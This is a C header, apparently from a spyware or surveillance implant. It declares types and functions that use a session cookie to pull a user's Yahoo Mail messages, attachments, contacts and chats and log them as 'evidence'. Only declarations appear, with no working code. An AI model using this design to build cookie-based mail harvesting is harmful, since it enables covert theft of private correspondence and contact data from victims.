#ifndef _YAHOO_H
#define _YAHOO_H

#include "JSON.h"

#define YAHOO_GLOBAL_IDENTIFIER "%253f.rand="
#define YAHOO_MAIL_IDENTIFIER ",[\"^all\",\""
#define YAHOO_CONTACT_IDENTIFIER "[\"ct\",\""
#define YAHOO_SERVERNAME_TAG	"servername:\""
#define YAHOO_SERVERNAME_TAG_2	"data-host=\""
#define YAHOO_WSSID_TAG			"wssid:\""
#define YAHOO_NEOGUID_TAG		"neoguid:\""
#define YAHOO_UUID_TAG			"uuid:\""
#define YAHOO_RANDOM_VALUE_TAG	".rand="

#define YAHOO_ALLOC_SIZE	512

typedef enum
{
	YAHOO_SUCCESS		= 0x100,
	YAHOO_ERROR,
	YAHOO_ALLOC_ERROR,
	YAHOO_SKIP,
};

typedef enum
{
	BOUNDARY_MAIL,
	BOUNDARY_SECTION,
	BOUNDARY_SUBSECTION
} YAHOO_BOUNDARY_TYPE;

typedef enum
{
	EVIDENCE_CONTACTS,
	EVIDENCE_MAILS
} YAHOO_EVIDENCE_TYPE;

typedef struct 
{
	LPWSTR strMailFolder;
	LPWSTR strServerName;
	LPWSTR strWSSID;
	LPWSTR strNeoGUID;
	LPWSTR strUUID; 
	LPWSTR strRndValue;
	int	   nReqValue;
	DWORD  dwLowTS;
	DWORD  dwHighTS;
	DWORD  dwLastMailDate;
} YAHOO_CONNECTION_PARAMS, *LPYAHOO_CONNECTION_PARAMS;

typedef struct
{
	LPWSTR strCompany;
	LPWSTR strEmail;
	LPWSTR strName;
	LPWSTR strPhone;
} YAHOO_CONTACT_VALUES, *LPYAHOO_CONTACT_VALUES;

typedef struct
{
	LPSTR	strAttachment;
	LPWSTR	strEncodedAttachment;
	DWORD	dwSize;
} YAHOO_MAIL_ATTACHMENT, *LPYAHOO_MAIL_ATTACHMENT;

typedef struct
{
	LPWSTR  strBoundary;
	LPWSTR	strPartID;
} YAHOO_MAIL_BOUNDARY, *LPYAHOO_MAIL_BOUNDARY;


typedef struct
{
	LPYAHOO_MAIL_BOUNDARY* lpBoundaries;
	DWORD	dwTotItems;
	DWORD	dwCurrentItem;
} YAHOO_MAIL_BOUNDARIES, *LPYAHOO_MAIL_BOUNDARIES;


typedef struct
{	
	LPWSTR  strCids;
	LPWSTR  strDisposition;
	LPWSTR  strEncoding;
	LPWSTR  strFilename;
	LPWSTR  strPartId;
	LPWSTR  strSubType;
	LPWSTR  strText;
	LPWSTR	strTypeParams;	
	LPWSTR  strType;
} YAHOO_MAIL_FIELDS, *LPYAHOO_MAIL_FIELDS;


typedef struct
{	
	LPWSTR  strMailUser;
	LPWSTR  strPeers;
	LPWSTR	strPeersID;
	LPWSTR  strAuthor;
	LPWSTR  strAuthorID;
	LPWSTR  strText;	
	LPWSTR  strType;
	LPWSTR  strSubType;
} YAHOO_CHAT_FIELDS, *LPYAHOO_CHAT_FIELDS;


DWORD	AsciiBufToBase64(LPWSTR* pInStr, LPWSTR strEncodingAlg);
DWORD	AsciiBufToQP(LPWSTR lpBuffer, DWORD dwSize, LPWSTR* lpUTFBuf);
//void	AsciiCharToQP(CHAR ch, LPSTR lpOutBuf);
void	AsciiCharToQP(WCHAR ch, LPSTR lpOutBuf);
//BOOL	ConvertChar(CHAR ch, BOOL bEOL);
BOOL	ConvertChar(WCHAR ch, BOOL bEOL);
DWORD	ConvertToUTF8(LPWSTR pIn, LPSTR* pOut);

//void	DumpYHTcpData(LPCWSTR lpFileName, char* lpBuffer, DWORD dwSize);
//void	DumpYHTcpData(LPCWSTR lpFileName, WCHAR* lpBuffer, DWORD dwSize);
DWORD	ReallocAndAppendString(__out LPWSTR *pBuffer, __in LPWSTR pwcsStrToAppend, __in LPWSTR pwcsStrAdd=NULL);

DWORD	YHAddBoundary(LPYAHOO_MAIL_BOUNDARY** pBoundaries, DWORD nItems, LPWSTR strBoundary, LPWSTR strPartID);
DWORD	YHAddMailBoundary(LPWSTR * strMail, LPYAHOO_MAIL_BOUNDARIES lpMailBoundaries, BOOL bCloseSection);
DWORD	YHAddAttachment(LPWSTR* strMail, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPYAHOO_MAIL_FIELDS lpMailFields, LPSTR strMailID, LPSTR strCookie);
DWORD	YHAddChat(LPWSTR * strChat, LPYAHOO_CHAT_FIELDS pFields);
DWORD	YHAddSectionHeader(LPWSTR * strMail, LPYAHOO_MAIL_FIELDS pFields);
DWORD	YHAddSectionText(LPWSTR * strMail, LPYAHOO_MAIL_FIELDS pFields);
DWORD	YHAssembleMail(LPSTR strMailHeader, LPSTR strMailBody, LPSTR *strMail);
DWORD	YHAddBoundary(LPYAHOO_MAIL_BOUNDARY** pBoundaries, DWORD nItems, LPWSTR strBoundary, double dwSectionStep);
LPYAHOO_MAIL_BOUNDARY* YHCreateBoundaryArray(DWORD nItems);
DWORD	YHDelBoundary(LPYAHOO_MAIL_BOUNDARY* pBoundaries, DWORD dwItem);
DWORD	YHEncodeAttachment(LPYAHOO_MAIL_ATTACHMENT pAttachment, LPWSTR strEncodingAlg);
DWORD	YHExtractChatFields(JSONObject jMail, LPYAHOO_CHAT_FIELDS lpChatFields);
DWORD	YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LPYAHOO_MAIL_BOUNDARIES lpMailBoundaries);
DWORD	YHFreeBoundaries(LPYAHOO_MAIL_BOUNDARIES lpMailBoundaries);
DWORD	YHFreeChatFields(LPYAHOO_CHAT_FIELDS pFields);
DWORD	YHFreeConnectionParams(LPYAHOO_CONNECTION_PARAMS pYHParams);
DWORD	YHFreeContactFields(LPYAHOO_CONTACT_VALUES pFields);
DWORD	YHFreeMailFields(LPYAHOO_MAIL_FIELDS pYHMailFields);
void	YHGetBoundaryValue(LPWSTR strHeader, LPWSTR * strBoundary);
DWORD	YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR strCookie);
DWORD	YHGetConnectionParams(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie);
DWORD	YHGetFoldersName(JSONValue** jValue, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie);
DWORD	YHGetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrName);
DWORD	YHGetMail(LPSTR* strMail, LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie);
DWORD	YHGetMailAttachment(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPYAHOO_MAIL_FIELDS pYHMailFields, LPSTR strCookie, LPYAHOO_MAIL_ATTACHMENT pAttachment);
DWORD	YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie, LPSTR* strMailBody);
DWORD	YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie, LPSTR* strMailHeader);
DWORD	YHGetMailsList(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams, JSONValue** jValue, JSONArray* pjMail, LPDWORD pdwNrOfMails);
DWORD	YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams);
DWORD	YHLogMails(LPSTR strRecvBuffer, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie);
BOOL	YHParseForParams(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strBuffer);
DWORD	YHSetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrName);

//social handlers
DWORD	YahooMessageHandler(LPSTR strCookie);
DWORD	YahooContactHandler(LPSTR strCookie);

#endif _YAHOO_H